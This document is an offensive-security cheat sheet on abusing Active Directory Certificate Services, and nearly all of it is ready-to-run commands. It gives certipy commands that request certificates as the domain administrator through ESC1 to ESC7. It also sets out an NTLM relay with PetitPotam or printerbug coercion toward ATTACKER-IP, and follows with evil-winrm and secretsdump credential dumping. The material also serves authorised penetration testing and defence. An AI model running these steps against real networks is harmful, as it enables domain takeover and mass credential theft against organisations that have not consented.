# ADCS Abuse (Active Directory Certificate Services)

## Overview
AD Certificate Services can be abused to obtain certificates that allow authentication as any user, including Domain Admins. The ESC (Escalation) techniques were cataloged by SpecterOps.

## Enumeration
```bash
# Find vulnerable templates with certipy:
certipy find -u 'USER'@DOMAIN -p 'PASS' -dc-ip DC-IP -vulnerable -stdout

# Or with Certify.exe (Windows):
Certify.exe find /vulnerable
```

---

## ESC1 — Enrollee Supplies Subject Alternative Name
**Condition:** Template allows enrollee to specify SAN + low-priv user can enroll

```bash
certipy req -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -template VULN-TEMPLATE -upn administrator@DOMAIN
certipy auth -pfx administrator.pfx -dc-ip DC-IP
```

## ESC2 — Any Purpose EKU or No EKU
**Condition:** Template has "Any Purpose" EKU or SubCA + enrollee can request

Similar to ESC1 — request cert, use for auth. The "Any Purpose" EKU means the cert can be used for client auth.

## ESC3 — Enrollment Agent Template
**Condition:** Template allows enrollment agent + another template allows enroll-on-behalf-of

```bash
# Step 1: Get enrollment agent cert
certipy req -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -template ENROLLMENT-AGENT-TEMPLATE
# Step 2: Use it to request cert on behalf of admin
certipy req -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -template TARGET-TEMPLATE -on-behalf-of 'DOMAIN\Administrator' -pfx enrollment_agent.pfx
certipy auth -pfx administrator.pfx -dc-ip DC-IP
```

## ESC4 — Vulnerable Template ACL
**Condition:** Low-priv user has write access to a certificate template object

Modify the template to make it vulnerable to ESC1, then exploit ESC1.
```bash
certipy template -u 'USER'@DOMAIN -p 'PASS' -template VULN-TEMPLATE -save-old
# Template is now ESC1-vulnerable, exploit it:
certipy req -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -template VULN-TEMPLATE -upn administrator@DOMAIN
# Restore original template:
certipy template -u 'USER'@DOMAIN -p 'PASS' -template VULN-TEMPLATE -configuration old_template.json
```

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA
**Condition:** CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set

Any template becomes ESC1-like. Request any cert and specify SAN.

## ESC7 — Vulnerable CA ACL
**Condition:** Low-priv user has ManageCA or ManageCertificates on the CA

```bash
# Add yourself as officer (ManageCA):
certipy ca -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -add-officer USER
# Enable SubCA template:
certipy ca -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -enable-template SubCA
# Request SubCA cert (will be denied):
certipy req -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -template SubCA -upn administrator@DOMAIN
# Issue the denied request:
certipy ca -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -issue-request REQUEST-ID
# Retrieve:
certipy req -u 'USER'@DOMAIN -p 'PASS' -ca CA-NAME -retrieve REQUEST-ID
```

## ESC8 — NTLM Relay to HTTP Enrollment
**Condition:** CA has HTTP enrollment endpoint (certsrv) + no EPA/HTTPS enforcement

```bash
# Set up relay:
certipy relay -target http://CA-IP/certsrv/certfnsh.asp -ca CA-NAME
# Coerce DC authentication:
python3 PetitPotam.py ATTACKER-IP DC-IP
# Or: python3 printerbug.py DOMAIN/USER:PASS@DC-IP ATTACKER-IP
# Relay captures DC cert → auth as DC:
certipy auth -pfx dc.pfx -dc-ip DC-IP
```

---

## Post-Exploitation with Cert
```bash
# Auth with PFX → get NT hash:
certipy auth -pfx administrator.pfx -dc-ip DC-IP
# Use the hash:
evil-winrm -i DC-IP -u Administrator -H NTHASH
impacket-secretsdump 'DOMAIN/Administrator'@DC-IP -hashes :NTHASH
```

## Key Tools
- **certipy** (Python) — find, request, auth, relay
- **Certify.exe** (C#) — find, request (Windows)
- **ForgeCert** — forge certs with stolen CA key
- **PetitPotam** / **PrinterBug** — coerce authentication for relay
